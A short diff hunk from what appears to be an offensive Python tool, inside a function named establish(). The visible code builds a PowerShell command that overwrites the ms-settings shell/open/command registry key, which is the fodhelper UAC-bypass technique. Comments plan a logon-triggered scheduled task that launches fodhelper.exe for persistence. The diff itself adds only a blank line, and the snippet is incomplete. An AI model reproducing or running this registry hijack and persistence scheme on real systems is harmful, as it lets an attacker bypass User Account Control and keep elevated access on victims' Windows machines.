@@ -197,6 +197,7 @@ def establish():
     cmd3 = ["powershell", "-Command", "Set-Item", "-Path", "HKCU:\\SOFTWARE\\Classes\\ms-settings\\shell\\open\\command",
             "-Value", "C:\\Windows\\System32\\ProcMon.exe", "-Force"]
 
+
     #TODO: schedule task... At Login, powershell.exe -c fodhelper.exe
     #'New-ScheduledTaskTrigger', 'At-LogOn'
     #'New-ScheduledTaskAction', '-Execute', 'powershell.exe', '-c', 'fodhelper.exe'
